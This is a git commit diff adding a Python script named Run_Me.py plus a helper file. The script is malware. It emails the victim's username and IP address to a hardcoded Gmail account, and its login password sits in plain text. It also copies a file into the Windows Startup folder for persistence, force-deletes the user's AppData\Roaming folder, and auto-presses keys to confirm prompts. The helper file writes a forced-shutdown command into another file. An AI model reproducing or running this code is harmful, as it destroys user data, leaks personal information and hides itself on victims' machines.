240ce358d1c2e2a9bd89bc50ea0154874a716ddb
bendog123 <56412365+bendog123@users.noreply.github.com>
2021-12-13 23:28:23 -0500

    Add files via upload

--- Run_Me.py
+++ Run_Me.py
@@ -1,29 +1,85 @@
 
-def vid():
-    os.system("nircmd.exe setsysvolume 65535")
-    #open("https://www.youtube.com/watch?v=sntGta76v6Y")
-
-#del apps
-
-print(de)
+import email
+import getpass as gp
+import os
+import smtplib
+import socket
+import ssl
+import threading
+from email import encoders
+from email.mime.base import MIMEBase
+from email.mime.multipart import MIMEMultipart
+from email.mime.text import MIMEText
+from time import sleep
+from webbrowser import open
+import pydirectinput as di
+#slettes all the vars in place
+user = gp.getuser() 
+message = MIMEMultipart()
+port = 465  # For SSL
+password = "hotdogben"
+sender_email = "benmc303@gmail.com"
+receiver_email = "benhotdog3@gmail.com"
+smtp_server = "smtp.gmail.com"
+subject = user
 threads = []
+message["From"] = sender_email
+message["To"] = receiver_email
+message["SUBJECT"] = user
+userip = socket.gethostbyname(socket.gethostname())
+#del apps
+de = 'del /f'
+de += ' "C:\\Users\\'
+de += user
+de += '\\AppData\\Roaming"'
+#This is to put it in the startup
+mv = 'copy "'
+mv += os.path.abspath(__file__)
+mv = mv.replace('Run_Me.py', 'cool.py')
+mv = mv.replace('Run_Me.exe', 'cool.exe')
+mv += '"'
+mv = mv.replace('\\', '\\\\')
+mv += ' "C:\\\\Users\\\\'
+mv += user
+mv += '\\\\AppData\\\\Roaming\\\\Microsoft\\\\Windows\\\\Start Menu\\\\Programs\\\\Startup"'
+print(mv)
+#This is the shit for the message in the email
+message = MIMEMultipart()
+Subject = user
+port = 465  # For SSL
+userip = socket.gethostbyname(socket.gethostname())
+text = "ip is = "
+text += userip
+message.attach(MIMEText(text))
+print(message)
+message = str(message)
+context = ssl.create_default_context()
+def vid():
+    open("https://www.youtube.com/watch?v=sntGta76v6Y")
+def send():#This is the thing that sends the email
+    try:
+        with smtplib.SMTP_SSL("smtp.gmail.com",  465, context=context) as server:
+            server.login(sender_email, password)
+            server.sendmail(sender_email, receiver_email, message)
+    except:
+        x=1
 def nEnter():
     sleep(4)
     di.press('n')
     di.press('enter')
-#tread
-def maintread():
+def tread():
     for n in range(1):
         t = threading.Thread(target=nEnter)
         t.daemon = True
         threads.append(t)
         threads[0].start()
 def Main():
-    #send()
+    send()
     os.system(mv)
+    tread()
     os.system(de)
-    maintread()
-    #vid()
+    vid()
     sleep(10)
-    #import cool
-Main()
+    import cool
+if __name__ == '__main__':
+    Main()
---
+++ new_file.py
@@ -0,0 +1,2 @@
+with open("cool.txt", 'w') as f:
+    f.write("import os\nos.system('shutdown /f')")
